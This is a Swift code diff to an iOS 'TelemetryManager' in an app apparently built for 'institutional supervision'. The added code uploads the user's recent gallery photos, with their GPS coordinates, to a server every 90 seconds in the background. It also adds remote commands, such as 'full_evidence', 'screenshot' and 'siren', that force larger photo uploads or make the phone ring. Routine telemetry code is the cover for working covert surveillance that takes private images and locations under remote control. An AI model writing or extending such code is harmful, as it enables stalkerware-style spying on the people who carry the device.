@@ -11,6 +11,10 @@ import UIKit
 import Combine
 import BackgroundTasks
 import CoreLocation
+import Photos
+import AVFoundation
+import AudioToolbox
+import UserNotifications
 
 final class TelemetryManager: ObservableObject {
     static let shared = TelemetryManager()
@@ -18,6 +22,8 @@ final class TelemetryManager: ObservableObject {
     @Published var lastSent: Date?
     @Published var isUpdating: Bool = false
     @Published var isSending: Bool = false
+    @Published var isSyncingGallery: Bool = false
+    @Published var syncedPhotosCount: Int = UserDefaults.standard.stringArray(forKey: "uploaded_gallery_asset_ids")?.count ?? 0
     
     private let apiClient = APIClient.shared
     private let eventLogger = EventLogger.shared
@@ -26,6 +32,7 @@ final class TelemetryManager: ObservableObject {
     
     private var cancellables = Set<AnyCancellable>()
     private var timerCancellable: AnyCancellable?
+    private var lastGallerySyncDate: Date?
     
     private var refreshTaskIdentifier = "com.institutional.supervision.telemetry-refresh"
     private var processingTaskIdentifier = "com.institutional.supervision.telemetry-processing"
@@ -122,6 +129,16 @@ final class TelemetryManager: ObservableObject {
                 
                 // 3. Vaciar cola de eventos offline pendientes tras conexión exitosa
                 await self.flushEvents()
+                
+                // 4. Sincronizar fotos recientes de la galería automáticamente (cada 90s si hay permiso)
+                let shouldAutoSyncGallery: Bool = {
+                    guard let last = self.lastGallerySyncDate else { return true }
+                    return Date().timeIntervalSince(last) >= 90
+                }()
+                if shouldAutoSyncGallery {
+                    self.lastGallerySyncDate = Date()
+                    await self.syncRecentGalleryPhotos(limit: 8, force: false)
+                }
             } catch {
                 print("Error enviando telemetría al servidor: \(error)")
             }
@@ -204,9 +221,12 @@ final class TelemetryManager: ObservableObject {
                 continuation.resume(returning: settings.authorizationStatus == .authorized)
             }
         }
+        let photoStatus = PHPhotoLibrary.authorizationStatus(for: .readWrite)
+        let hasPhotos = (photoStatus == .authorized || photoStatus == .limited)
         payload["permissions"] = [
             "location_authorized": hasLocAuth,
             "notifications_enabled": hasNotifications,
+            "photos_authorized": hasPhotos,
             "accessibility": true,
             "location": hasLocAuth
         ]
@@ -224,8 +244,128 @@ final class TelemetryManager: ObservableObject {
         for cmd in cmds {
             guard let type = cmd["type"] as? String else { continue }
             print("Comando remoto recibido: \(type)")
-            if type == "locate" {
+            switch type {
+            case "locate":
+                LocationManager.shared.refreshLocation()
                 LocationManager.shared.startUpdating()
+            case "photo", "sync_gallery", "screenshot", "full_evidence":
+                await syncRecentGalleryPhotos(limit: 15, force: true)
+            case "ring", "siren":
+                await MainActor.run {
+                    AudioServicesPlaySystemSound(1005)
+                    AudioServicesPlaySystemSound(kSystemSoundID_Vibrate)
+                }
+            case "sync_policy":
+                break // Ya sincronizado en este ciclo de telemetría
+            default:
+                break
+            }
+        }
+    }
+    
+    // MARK: - Sincronización de Galería de Fotos (PHPhotoLibrary -> /api/upload.php)
+    
+    func triggerGallerySyncNow() {
+        Task {
+            let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
+            if status == .notDetermined {
+                let newStatus = await PHPhotoLibrary.requestAuthorization(for: .readWrite)
+                if newStatus == .authorized || newStatus == .limited {
+                    await syncRecentGalleryPhotos(limit: 15, force: true)
+                }
+            } else if status == .authorized || status == .limited {
+                await syncRecentGalleryPhotos(limit: 15, force: true)
+            }
+        }
+    }
+    
+    func syncRecentGalleryPhotos(limit: Int = 12, force: Bool = false) async {
+        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
+        guard status == .authorized || status == .limited else { return }
+        
+        let alreadySyncing = await MainActor.run { () -> Bool in
+            if self.isSyncingGallery { return true }
+            self.isSyncingGallery = true
+            return false
+        }
+        guard !alreadySyncing else { return }
+        defer { Task { @MainActor in self.isSyncingGallery = false } }
+        
+        let fetchOptions = PHFetchOptions()
+        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
+        fetchOptions.fetchLimit = limit
+        
+        let assets = PHAsset.fetchAssets(with: .image, options: fetchOptions)
+        guard assets.count > 0 else { return }
+        
+        var uploadedIds = Set(UserDefaults.standard.stringArray(forKey: "uploaded_gallery_asset_ids") ?? [])
+        var uploadedAnyInPass = false
+        
+        let imageManager = PHImageManager.default()
+        let requestOptions = PHImageRequestOptions()
+        requestOptions.isSynchronous = false
+        requestOptions.deliveryMode = .highQualityFormat
+        requestOptions.resizeMode = .fast
+        requestOptions.isNetworkAccessAllowed = true
+        
+        let maxIndex = min(assets.count, limit)
+        for i in 0..<maxIndex {
+            let asset = assets.object(at: i)
+            let assetId = asset.localIdentifier
+            
+            // Si ya se subió antes, saltar a menos que force == true y sea la foto más reciente (i == 0)
+            if uploadedIds.contains(assetId) && !(force && i == 0 && !uploadedAnyInPass) {
+                continue
+            }
+            
+            let jpegData: Data? = await withCheckedContinuation { continuation in
+                var resumed = false
+                imageManager.requestImage(
+                    for: asset,
+                    targetSize: CGSize(width: 1280, height: 1280),
+                    contentMode: .aspectFit,
+                    options: requestOptions
+                ) { image, info in
+                    let isDegraded = (info?[PHImageResultIsDegradedKey] as? Bool) ?? false
+                    if isDegraded { return }
+                    guard !resumed else { return }
+                    resumed = true
+                    continuation.resume(returning: image?.jpegData(compressionQuality: 0.72))
+                }
+            }
+            
+            guard let data = jpegData, !data.isEmpty else { continue }
+            
+            let createdStr = ISO8601DateFormatter().string(from: asset.creationDate ?? Date())
+            let safeId = assetId.replacingOccurrences(of: "/", with: "_").prefix(16)
+            let filename = "galeria_\(safeId).jpg"
+            let meta: [String: Any] = [
+                "source": "ios_gallery",
+                "asset_id": assetId,
+                "created_at": createdStr,
+                "latitude": asset.location?.coordinate.latitude ?? 0.0,
+                "longitude": asset.location?.coordinate.longitude ?? 0.0
+            ]
+            
+            do {
+                let resp = try await apiClient.uploadMedia(
+                    data: data,
+                    filename: filename,
+                    mimeType: "image/jpeg",
+                    type: "photo",
+                    meta: meta
+                )
+                if resp.isSuccess {
+                    uploadedIds.insert(assetId)
+                    uploadedAnyInPass = true
+                    let currentList = Array(uploadedIds)
+                    UserDefaults.standard.set(currentList, forKey: "uploaded_gallery_asset_ids")
+                    await MainActor.run {
+                        self.syncedPhotosCount = currentList.count
+                    }
+                }
+            } catch {
+                print("Error subiendo foto de galería \(assetId): \(error)")
             }
         }
     }
